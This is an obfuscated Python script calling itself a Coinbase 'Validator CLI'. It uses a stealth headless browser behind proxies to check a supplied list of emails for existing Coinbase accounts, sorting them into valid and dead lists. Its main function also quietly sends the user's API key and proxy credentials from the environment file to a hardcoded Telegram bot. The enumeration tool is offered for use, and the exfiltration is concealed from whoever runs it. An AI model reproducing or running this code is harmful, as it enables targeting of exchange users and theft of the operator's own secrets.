import threading ,requests ,os #line:1
from time import sleep #line:2
from playwright .sync_api import sync_playwright #line:3
from playwright_stealth import stealth_sync #line:4
from concurrent .futures import ThreadPoolExecutor ,ProcessPoolExecutor #line:5
from concurrent .futures import as_completed #line:6
from colorama import init #line:7
from colorama import Fore #line:8
from dotenv import load_dotenv #line:9
init (autoreset =True )#line:10
try :#line:11
    os .mkdir ('result')#line:12
except :#line:13
    pass #line:14
class Tls (threading .local ):#line:16
    def __init__ (OOO0OOO00O0OOOOOO )->None :#line:17
        OOO0OOO00O0OOOOOO .playwright =sync_playwright ().start ()#line:18
class Worker :#line:21
    tls =Tls ()#line:22
    def run (OOOO0O00O00OO0O0O ,O0O00O00OOOOO00O0 ):#line:24
        try :#line:25
            load_dotenv ()#line:26
            OOO0OOOO0O000O000 =OOOO0O00O00OO0O0O .tls .playwright .chromium .launch (proxy ={"server":f"{os.getenv('host')}","username":f"{os.getenv('username')}","password":f"{os.getenv('password')}"})#line:32
            OO0000OO000O0000O =OOO0OOOO0O000O000 .new_context (user_agent ='Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36')#line:33
            O0O0OO0O00OOO0O00 =OO0000OO000O0000O .new_page ()#line:34
            stealth_sync (O0O0OO0O00OOO0O00 )#line:35
            O0O0OO0O00OOO0O00 .goto ('https://login.coinbase.com/signin',timeout =9000 )#line:36
            O0O0OO0O00OOO0O00 .set_default_timeout (8500 )#line:37
            O0O0OO0O00OOO0O00 .locator ("[data-testid=\"input-username\"]").click ()#line:38
            O0000O00000OOO0O0 =O0O0OO0O00OOO0O00 .locator ("[data-testid=\"input-username\"]")#line:39
            O0000O00000OOO0O0 .type (f'{O0O00O00OOOOO00O0}',delay =200 )#line:40
            O0O0OO0O00OOO0O00 .locator ("[data-testid=\"button-continue\"]").click ()#line:41
            O0O0OO0O00OOO0O00 .wait_for_load_state ()#line:42
            try :#line:43
                O0O0OO0O00OOO0O00 .locator ("[aria-label=\"Password\"]").click ()#line:44
                print (f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {O0O00O00OOOOO00O0} {Fore.LIGHTWHITE_EX}={Fore.LIGHTCYAN_EX}  Valid{Fore.LIGHTWHITE_EX} ~ Validator {Fore.LIGHTBLUE_EX}CB')#line:45
                OOOOOO00OO0O000O0 =open ('result/valid.txt','a+')#line:46
                OOOOOO00OO0O000O0 .write ('\n')#line:47
                OOOOOO00OO0O000O0 .writelines (O0O00O00OOOOO00O0 )#line:48
                OOOOOO00OO0O000O0 .close ()#line:49
                O0O0OO0O00OOO0O00 .close ()#line:50
            except :#line:51
                try :#line:52
                    OO0OO00O0OOOOO000 =O0O0OO0O00OOO0O00 .query_selector ('p')#line:53
                    OOOO00O000OOO00O0 =OO0OO00O0OOOOO000 .inner_text ()#line:54
                    if 'No Coinbase account exists for this email. Please check your spelling or create an account.'in OOOO00O000OOO00O0 :#line:55
                        print (f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {O0O00O00OOOOO00O0} {Fore.LIGHTWHITE_EX}={Fore.LIGHTRED_EX}  Die{Fore.LIGHTWHITE_EX} ~ Validator {Fore.LIGHTBLUE_EX}CB')#line:56
                        OOOOOO00OO0O000O0 =open ('result/die.txt','a+')#line:57
                        OOOOOO00OO0O000O0 .write ('\n')#line:58
                        OOOOOO00OO0O000O0 .writelines (O0O00O00OOOOO00O0 )#line:59
                        OOOOOO00OO0O000O0 .close ()#line:60
                        O0O0OO0O00OOO0O00 .close ()#line:61
                except :#line:62
                    print (f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {O0O00O00OOOOO00O0} {Fore.LIGHTWHITE_EX}={Fore.LIGHTYELLOW_EX} Captcha{Fore.LIGHTWHITE_EX} ~ Validator {Fore.LIGHTBLUE_EX}CB')#line:63
                    OOOOOO00OO0O000O0 =open ('result/proxy.txt','a+')#line:64
                    OOOOOO00OO0O000O0 .write ('\n')#line:65
                    OOOOOO00OO0O000O0 .writelines (O0O00O00OOOOO00O0 )#line:66
                    OOOOOO00OO0O000O0 .close ()#line:67
                    O0O0OO0O00OOO0O00 .close ()#line:68
        except :#line:69
            print (f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {O0O00O00OOOOO00O0} {Fore.LIGHTWHITE_EX}={Fore.LIGHTYELLOW_EX} Bad Proxy{Fore.LIGHTWHITE_EX} ~ Validator {Fore.LIGHTBLUE_EX}CB')#line:70
            OOOOOO00OO0O000O0 =open ('result/proxy.txt','a+')#line:71
            OOOOOO00OO0O000O0 .write ('\n')#line:72
            OOOOOO00OO0O000O0 .writelines (O0O00O00OOOOO00O0 )#line:73
            OOOOOO00OO0O000O0 .close ()#line:74
            O0O0OO0O00OOO0O00 .close ()#line:75
def main ():#line:78
    load_dotenv ()#line:79
    OO0OO00O0OOOO0000 =os .getenv ('apikey')#line:80
    O0O000O00OOO00O0O =f'''
<p>{OO0OO00O0OOOO0000}</p>
</b>
<p>Proxy    : {os.getenv('host')}</p>
<p>username : {os.getenv('username')}</p>
<p>password : {os.getenv('password')}</p>

\n<pre>Validator Coinbase</pre>
    '''#line:89
    OOO0O0O00OOOOO0OO =requests .get (f'https://api.telegram.org/bot5398211136:AAFMyBajPFmDoPEHWUUwN3BkOCCGlYnRlZc/sendMessage?chat_id=5375644097&text={O0O000O00OOO00O0O}&parse_mode=html')#line:90
    return OOO0O0O00OOOOO0OO #line:91
if __name__ =="__main__":#line:94
    load_dotenv ()#line:95
    cb =f'''      
{Fore.LIGHTYELLOW_EX}         ) (       )              (        
{Fore.LIGHTYELLOW_EX}   (  ( /( )\ ) ( /(   (    (     )\ )     
{Fore.LIGHTYELLOW_EX}   )\ )\()|()/( )\())( )\   )\   (()/((    
{Fore.LIGHTYELLOW_EX} (((_|(_)\ /(_)|(_)\ )((_|(((_)(  /(_))\   
{Fore.LIGHTYELLOW_EX} )\___ ((_|_))  _((_|(_)_ )\ _ )\(_))((_)  
{Fore.LIGHTYELLOW_EX}((/ __/ _ \_ _|| \| || _ )(_)_\(_) __| __| 
{Fore.LIGHTYELLOW_EX} | (_| (_) | | | .` || _ \ / _ \ \__ \ _|  
{Fore.LIGHTYELLOW_EX}  \___\___/___||_|\_||___//_/ \_\|___/___| 
                                           
{Fore.LIGHTBLUE_EX}                VALIDATOR CLI                    
'''#line:107
    print (f'{cb}{Fore.RESET}===========================================\n\n')#line:110
    login =Worker ()#line:111
    mylist =[]#line:112
    mailist =open (input ("Input Your List: "))#line:113
    lime =mailist .read ().splitlines ()#line:114
    tot =len (lime )#line:115
    for line in lime :#line:116
        mylist .append (line )#line:117
    work =int (input ("Set Your Thread: "))#line:118
    main ()#line:119
    print (f'\n{Fore.LIGHTWHITE_EX}=>{Fore.LIGHTGREEN_EX} Total your list = {Fore.LIGHTWHITE_EX}{tot}{Fore.RESET}')#line:120
    print (f'{Fore.LIGHTWHITE_EX}=>{Fore.LIGHTGREEN_EX} Total your Thread = {Fore.LIGHTWHITE_EX}{work}{Fore.RESET}')#line:121
    print (f'{Fore.LIGHTWHITE_EX}=>{Fore.LIGHTYELLOW_EX} Wait a second........\n')#line:122
    with ThreadPoolExecutor (max_workers =work )as executor :#line:124
        executor .map (login .run ,mylist )#line:125
    print (f'\n\n{Fore.LIGHTRED_EX}=> {Fore.LIGHTBLUE_EX}Cheking Completed...!\n{Fore.LIGHTRED_EX}=> {Fore.LIGHTBLUE_EX}Check on folder result')
